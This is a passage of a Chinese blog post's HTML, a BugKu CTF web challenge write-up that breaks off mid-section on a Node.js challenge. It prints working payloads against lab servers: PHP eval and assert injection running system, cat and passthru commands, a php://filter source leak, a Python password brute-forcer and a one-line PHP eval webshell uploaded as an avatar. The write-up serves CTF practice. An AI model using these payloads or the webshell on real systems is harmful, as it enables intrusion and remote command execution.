@@ -1,0 +1,276 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>BugKu Web 刷题记录3 | Evolution957's blog</title><meta name="keywords" content="CTF,Web,BugKu"><meta name="author" content="Evolution957"><meta name="copyright" content="Evolution957"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="BugKu Web 刷题记录3 参考： PHP程序执行 BugKu-Web-wp1 BugKu-Web-wp2 BugKu-Web-wp3  game1一局游戏结束后，发现抓到了一个可疑的数据包  猜测sign字段是base64加密的，但解码后发现是无用字符，又对score字段尝试base64加密，发现25的base64码是MjU&#x3D;，故猜测sign字段本质上是不是’zM’+’base64">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BugKu Web 刷题记录3">
+<meta property="og:url" content="https://evolution957.github.io/2022/04/27/BugKu-Web3/index.html">
+<meta property="og:site_name" content="Evolution957&#39;s blog">
+<meta property="og:description" content="BugKu Web 刷题记录3 参考： PHP程序执行 BugKu-Web-wp1 BugKu-Web-wp2 BugKu-Web-wp3  game1一局游戏结束后，发现抓到了一个可疑的数据包  猜测sign字段是base64加密的，但解码后发现是无用字符，又对score字段尝试base64加密，发现25的base64码是MjU&#x3D;，故猜测sign字段本质上是不是’zM’+’base64">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://evolution957.github.io/img/BugKu_Web3.jpg">
+<meta property="article:published_time" content="2022-04-27T15:38:08.000Z">
+<meta property="article:modified_time" content="2022-04-27T15:38:08.000Z">
+<meta property="article:author" content="Evolution957">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="BugKu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://evolution957.github.io/img/BugKu_Web3.jpg"><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="https://evolution957.github.io/2022/04/27/BugKu-Web3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'BugKu Web 刷题记录3',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-04-27 23:38:08'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/iconfont.css"><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Evolution957's blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/BugKu_Web3.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Evolution957's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BugKu Web 刷题记录3</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-27T15:38:08.000Z" title="发表于 2022-04-27 23:38:08">2022-04-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-27T15:38:08.000Z" title="更新于 2022-04-27 23:38:08">2022-04-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-Web/">CTF_Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BugKu Web 刷题记录3"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="BugKu-Web-刷题记录3"><a href="#BugKu-Web-刷题记录3" class="headerlink" title="BugKu Web 刷题记录3"></a>BugKu Web 刷题记录3</h1><blockquote>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/exec">PHP程序执行</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/401583380">BugKu-Web-wp1</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_58111246/article/details/123971455?spm=1001.2014.3001.5501">BugKu-Web-wp2</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2dbb1b38de1e">BugKu-Web-wp3</a></p>
+</blockquote>
+<h2 id="game1"><a href="#game1" class="headerlink" title="game1"></a>game1</h2><p>一局游戏结束后，发现抓到了一个可疑的数据包</p>
+<p><img src="https://s2.loli.net/2022/04/27/qpcmtIiEDoKwRuM.png" alt="game1_1.png"></p>
+<p>猜测sign字段是base64加密的，但解码后发现是无用字符，又对score字段尝试base64加密，发现25的base64码是MjU&#x3D;，故猜测sign字段本质上是不是’zM’+’base64_encode(score)’+’&#x3D;&#x3D;’这样组成的，发送后发现确实可以得到flag</p>
+<p><img src="https://s2.loli.net/2022/04/27/c5I9fRCyYVqFkwi.png" alt="game1_2.png"></p>
+<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>先试试传入全局变量看看其中内容</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=$GLOBALS</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/27/3mGOYDJhBH8264i.png" alt="eval1.png"></p>
+<p>很好，被嘲讽了。eval会执行传入字符串，故构造payload让其执行命令</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=);show_source(&#x27;flag.php&#x27;);var_dump(</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/27/4u1rN5TXjQaVF63.png" alt="eval2.png"></p>
+<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>也可以直接使用file</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=file(&#x27;flag.php&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p>扫描发现有git文件泄露，故下载git文件（linux下）</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">wget</span> -r http://114.67.175.224:19331/.git</span><br></pre></td></tr></table></figure>
+
+<p>进入日志目录下</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cd</span> <span class="number">114.67.175.224:19331</span>/.git/logs</span><br></pre></td></tr></table></figure>
+
+<p>查看信息</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> reflog</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/27/9iGlevcpH3gEZjJ.png" alt="source1.png"></p>
+<p>使用git show命令查看文件，最终在40c6d51文件里找到flag</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> show 40c6d51</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/27/jXeQsLpJgoF5ril.png" alt="source2.png"></p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="方法1-1"><a href="#方法1-1" class="headerlink" title="方法1"></a>方法1</h3><p>尝试查看源码</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10060/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p>base64解码后获得源码和flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-web&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file])&#123;echo &#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;;&#125;</span><br><span class="line">	$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">	if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	include($file); </span><br><span class="line">//flag:flag&#123;ee54957897543831f6aa21d30f46913d&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="方法2-1"><a href="#方法2-1" class="headerlink" title="方法2"></a>方法2</h3><p>也可以直接构造该payload获得flag</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10060/index.php?file=//flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="好像需要密码"><a href="#好像需要密码" class="headerlink" title="好像需要密码"></a>好像需要密码</h2><p>直接5位纯数字爆破（密码是12468)，exp如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">lens = <span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">	password = <span class="built_in">str</span>(password)</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">len</span>(password)&lt;lens):</span><br><span class="line">		diff = lens-<span class="built_in">len</span>(password)</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(diff):</span><br><span class="line">			password = <span class="string">&#x27;0&#x27;</span> + password</span><br><span class="line">	test = requests.post(<span class="string">&#x27;http://114.67.175.224:15735/&#x27;</span>,data=&#123;<span class="string">&#x27;pwd&#x27;</span>: password&#125;)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;当前测试的密码为：&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(password)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> test.text:</span><br><span class="line">		flag = re.findall(<span class="string">&quot;flag\&#123;(.*)?\&#125;&quot;</span>,test.text)</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;[+]正确的密码为：&#x27;</span>,password)</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;[*]flag&#123;&#x27;</span>+flag[<span class="number">0</span>]+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/27/3dtQCz5cogAI9F4.png" alt="password.png"></p>
+<h2 id="No-one-knows-regex-better-than-me"><a href="#No-one-knows-regex-better-than-me" class="headerlink" title="No one knows regex better than me"></a>No one knows regex better than me</h2><p>打开网页即可获得源码，本地分析源码测试如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$zero</span> = <span class="string">&quot;\\ZmxhZw==&quot;</span>; <span class="comment">//&#x27;ZmxhZw==&#x27;是flag的base64编码</span></span><br><span class="line"><span class="variable">$first</span>=<span class="string">&quot;ag/\\|.php&quot;</span>;</span><br><span class="line"><span class="variable">$second</span>=<span class="variable">$zero</span>.<span class="variable">$first</span>;</span><br><span class="line"><span class="comment">// echo $second;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/Yeedo|wants|a|girl|friend|or|a|flag/i&quot;</span>,<span class="variable">$second</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;[1]&quot;</span>;</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$second</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.\.|flag/&quot;</span>,<span class="variable">$key</span>))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Noooood hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;[2]&quot;</span>;</span><br><span class="line">        <span class="variable">$third</span>=<span class="variable">$first</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\|\056\160\150\x70/i&quot;</span>,<span class="variable">$third</span>))&#123; <span class="comment">// |.php</span></span><br><span class="line">        	<span class="keyword">echo</span> <span class="string">&quot;[3]&quot;</span>;</span><br><span class="line">            <span class="variable">$end</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$third</span>,<span class="number">5</span>);</span><br><span class="line">            <span class="comment">// echo $zero;</span></span><br><span class="line">            <span class="comment">// echo $end;</span></span><br><span class="line">            <span class="comment">// highlight_file(base64_decode($zero).$end);//maybe flag in flag.php</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$zero</span>).<span class="variable">$end</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;fail!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>写脚本提交即可，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:17373/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">&#x27;zero&#x27;</span>:<span class="string">&quot;\\ZmxhZw==&quot;</span>, <span class="comment">#ZmxhZw==</span></span><br><span class="line">	<span class="string">&#x27;first&#x27;</span>:<span class="string">&quot;ag/\\|.php&quot;</span> <span class="comment">#aaaa|.php</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data);</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/27/V5Yd92Ri3HZNUvW.png" alt="better_re.png"></p>
+<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>先查看提示，分析后如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;a#s#s#e#r#t&quot;</span>;</span><br><span class="line"><span class="variable">$poc_1</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$poc</span>);</span><br><span class="line"><span class="comment">//print_r($poc_1);</span></span><br><span class="line"><span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>];</span><br><span class="line"><span class="comment">//print_r($poc_2);</span></span><br><span class="line"><span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]); <span class="comment">//assert($_GET[&#x27;s&#x27;])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现传入s即可，故构造payload，先执行ls命令查看有哪些文件</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11841/?s=system(%27ls%27)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/27/esdpv8BWliSRng4.png" alt="shell1.png"></p>
+<p>查看该txt文件即可获得flag</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11841/?s=system(%27cat%20flaga15808abee46a1d5.txt%27)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/27/8DhOGmWrz93K6wd.png" alt="shell2.png"></p>
+<h2 id="聪明的php"><a href="#聪明的php" class="headerlink" title="聪明的php"></a>聪明的php</h2><p>随意传参得到源码提示</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass a parameter and maybe the flag file&#x27;s filename is random :&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> AS <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123;          </span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;./template.html&#x27;</span>);                 </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>可以看到system等命令已经被禁用了，故使用passthru来执行命令</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15783/index.php?a=&#123;passthru(%27ls%20-al%20/%27)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/27/wRp7dIuoJKUT8AE.png" alt="php1.png"></p>
+<p>发现一个很可疑文件，去读取即可获得flag</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15783/index.php?a=&#123;passthru(%27tac%20/_7782%27)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/27/NYuIkAJXHZKewjq.png" alt="php2.png"></p>
+<blockquote>
+<p>有关程序执行可看此网站：<a target="_blank" rel="noopener" href="https://www.php.net/exec">PHP程序执行</a></p>
+<p>参考wp：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/401583380">BugKu-Web-wp1</a></p>
+</blockquote>
+<h2 id="xxx二手交易市场"><a href="#xxx二手交易市场" class="headerlink" title="xxx二手交易市场"></a>xxx二手交易市场</h2><p>看了一圈发现没什么东西，注册账号登录，发现可以上传头，故进行图片上传并抓包，发现图片是用base64编码的，故构造一句话木马传进去（注意使用base64编码，且前面的jpeg要改为php）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/27/m6kYFzCrnJpso98.png" alt="xxxx1.png"></p>
+<p>用中国蚁剑连接传入php文件地址（密码为cmd），翻找后获得flag。</p>
+<p><img src="https://s2.loli.net/2022/04/27/zIYa4Xc39OCHf7L.png" alt="xxxx2.png"></p>
+<h2 id="闪电十六鞭"><a href="#闪电十六鞭" class="headerlink" title="闪电十六鞭"></a>闪电十六鞭</h2><p>打开网页即可获得源码，分析后构造payload即可获得flag</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:17903/?flag=$a=%27flaa%27;$a&#123;3&#125;=%27g%27;?%3E%3C?=$$a;?%3Ebbbbbbbbbbbbbbbbbb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/27/zra8M3yHTnWsIeo.png" alt="teacherma.png"></p>
+<blockquote>
+<p>参考wp：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_58111246/article/details/123971455?spm=1001.2014.3001.5501">BugKu-Web-wp2</a></p>
+</blockquote>
+<h2 id="sodirty"><a href="#sodirty" class="headerlink" title="sodirty"></a>sodirty</h2><p>用御剑扫一遍发现<code>www.zip</code></p>
+<p><img src="https://s2.loli.net/2022/04/27/Iv5dpC3bAocHKXt.png" alt="dirty1.png"></p>
+<p>解压后，重点看routes下的index.js文件，其中，getflag是我们获取flag的地方</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/getflag&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">password</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">password</span> === req.<span class="property">session</span>.<span class="property">challenger</span>.<span class="property">password</span>)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">challenger</span>.<span class="property">age</span> &gt; <span class="number">79</span>)&#123;  <span class="comment">//  age&lt;=79</span></span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;糟老头子坏滴很&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">key</span>.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">Admin</span>[key] === password)&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(process.<span class="property">env</span>.<span class="property">flag</span> ? process.<span class="property">env</span>.<span class="property">flag</span> : <span class="string">&quot;flag&#123;test&#125;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;密码错误，请使用管理员用户名登录.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>update可以更新键值对，是我们主要要利用的函数</p>
